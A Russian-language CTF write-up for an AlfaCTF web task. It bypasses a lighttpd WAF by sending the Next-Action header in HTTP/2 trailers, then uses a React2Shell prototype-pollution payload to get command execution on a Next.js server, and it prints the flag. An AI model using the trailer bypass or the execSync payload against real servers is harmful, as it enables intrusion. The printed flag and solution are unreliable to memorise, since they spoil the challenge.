# Фуникулёр

**Категория:** Web  
**URL:** https://funicular-gm2cxozn.alfactf.ru/  
**Флаг:** `alfa{trA1lERS_r34CH_rE4c7_4Nd_7H3_fuNICular_rUn5_AGaIN}`

## Условие

Суббота. Вы с коллегами приезжаете на терминал фуникулёра пораньше, надеясь успеть на первый подъём. Но вместо привычной заставки на экране горит дерзкая надпись: «КУРАГУ ДРУЗЬЯМ КУБАНИ».

Сотрудники суетятся, кто-то уже грозит «вызвать всех, кого надо», но ждать, пока раскачается расследование инцидента, не входило в ваши планы. Кататься хочется сейчас, так что, похоже, разбираться придётся самим.

Исследуйте систему фуникулёра и восстановите штатную работу, запустив скрипт восстановления из бэкапа.

---

## Анализ системы

В ходе разведки было обнаружено приложение Next.js, работающее за WAF lighttpd. Ключевые находки:

1. **Стек приложения**: Next.js 15.1.3 с React Server Components и Server Actions
2. **Защита WAF**: lighttpd 1.4.81 блокирует заголовки Next-Action regex'ом `^Next-Action$`
3. **Recovery Action**: Server Action для восстановления системы фуникулёра с action ID `4082c44f4a6a9cc400f0e6b45ed1c06c10f100aad2`
4. **Поддержка HTTP/2**: Сервер принимал HTTP/2 соединения, что позволяло продвинутую манипуляцию заголовками

Приложение раскрывало JavaScript бандлы, показывающие внутреннюю структуру и подтверждающие наличие системы восстановления работы фуникулёра из бэкапа.

Были протестированы несколько попыток обхода:
- **Варианты имён заголовков** (изменения регистра, дубликаты) — заблокированы WAF
- **Варианты HPACK кодирования** (never-indexed, literal кодирование) — по-прежнему заблокированы
- **Разделение фреймов** (CONTINUATION фреймы) — заблокировано
- **HTTP/2 trailers** — успешно обходят WAF

## Решение

Решение объединило две продвинутые техники:

### 1. Обход WAF через HTTP/2 Trailers

WAF lighttpd проверял заголовки только в начальном фрейме HEADERS, но не в trailer заголовках, отправляемых после тела запроса. Мы эксплуатировали это:

```python
# Отправляем заголовки без Next-Action
header_block = encode_headers([
    (":method", "POST"), (":path", "/"), 
    ("trailer", "next-action")  # Объявляем trailer
])
send_headers_frame(NO_END_STREAM)

# Отправляем тело запроса
send_data_frame(NO_END_STREAM)

# Отправляем Next-Action во фрейме trailer (обходит WAF)
trailer_block = encode_headers([("next-action", ACTION_ID)])
send_trailer_headers_frame(END_STREAM)
```

### 2. Эксплуатация React2Shell RCE (CVE-2025-55182)

После достижения обхода WAF мы эксплуатировали Next.js Server Action используя React2Shell (CVE-2025-55182), который использует загрязнение прототипов в React Server Components:

```javascript
// Payload загрязнения прототипов в multipart FormData
{
    "then": "$1:__proto__:then",
    "status": "resolved_model", 
    "reason": -1,
    "value": "{\\"then\\":\\"$B1337\\"}",
    "_response": {
        "_prefix": "var res=process.mainModule.require('child_process').execSync('cmd').toString('base64'); throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`NEXT_REDIRECT;push;/login?a=${res};307;`});",
        "_chunks": "$Q2",
        "_formData": {"get": "$1:constructor:constructor"}
    }
}
```

Payload:
1. Эксплуатирует парсинг RSC протокола React через multipart FormData
2. Внедряет вредоносный JavaScript через поле `_prefix`
3. Использует загрязнение прототипов (`__proto__`) для эскалации контекста выполнения
4. Выполняет произвольные команды через `child_process.execSync`
5. Возвращает результат через ошибку NEXT_REDIRECT с base64-кодированными результатами

### 3. Обнаружение флага

После достижения RCE мы исследовали файловую систему и нашли флаг в системе восстановления из бэкапа:

```bash
# Найдены файлы системы бэкапа
ls -la /opt/funicular/
find / -name "*flag*" -type f 2>/dev/null

# Флаг найден в квитанции восстановления
cat /opt/funicular/archive/WO-17-04.receipt
```

**Флаг:** `alfa{trA1lERS_r34CH_rE4c7_4Nd_7H3_fuNICular_rUn5_AGaIN}`

Название флага символично — "trailers reach react and the funicular runs again" — отсылает к тому, как HTTP/2 trailers обошли WAF, чтобы достичь React компонентов для RCE, что позволило восстановить систему фуникулёра.

## Технические детали

**Ссылки на CVE:**
- CVE-2025-55182: React2Shell — Next.js Server Actions RCE через загрязнение прототипов React Server Components
- CVE-2025-66478: обход проверки trailer заголовков HTTP/2 в lighttpd

**Ключевые файлы:**
- `solve/rce_working.py` — финальный рабочий эксплойт, объединяющий обе техники
- `solve/probe29_waf_bypass_h2.py` — proof of concept обхода WAF через HTTP/2 trailers
- `solve/React2Shell/` — оригинальный фреймворк эксплуатации CVE-2025-55182
- `solve/rce_debug.py` — диагностический инструмент для тестирования payload'ов
